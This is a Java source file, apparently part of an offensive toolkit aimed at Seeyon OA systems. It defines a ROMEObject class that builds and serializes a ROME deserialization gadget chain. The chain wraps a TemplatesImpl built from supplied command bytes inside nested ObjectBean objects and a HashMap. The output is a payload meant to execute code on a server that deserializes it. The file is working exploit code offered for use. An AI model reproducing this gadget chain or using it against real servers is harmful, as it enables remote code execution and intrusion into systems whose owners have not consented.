package com.droplab.Controller.Seeyon.Common;

import com.droplab.Utils.UnSerialize.utils.Gadgets;
import com.sun.syndication.feed.impl.ObjectBean;

import javax.xml.transform.Templates;
import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.util.HashMap;

/**
 * 获取rome序列化链
 */
public class ROMEObject {
    private static ROMEObject romeObject=null;

    public static ROMEObject instance(){
        if(romeObject != null){

        }else {
            romeObject=new ROMEObject();
        }
        return romeObject;
    }

    public byte[] getObject ( final byte[] command ) throws Exception {
        Object o = Gadgets.createTemplatesImpl(command);
        ObjectBean delegate = new ObjectBean(Templates.class, o);
        ObjectBean root  = new ObjectBean(ObjectBean.class, delegate);
        HashMap hashMap = Gadgets.makeMap(root, root);
        ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(outputStream);
        objectOutputStream.writeObject(hashMap);
        return outputStream.toByteArray();
    }

}
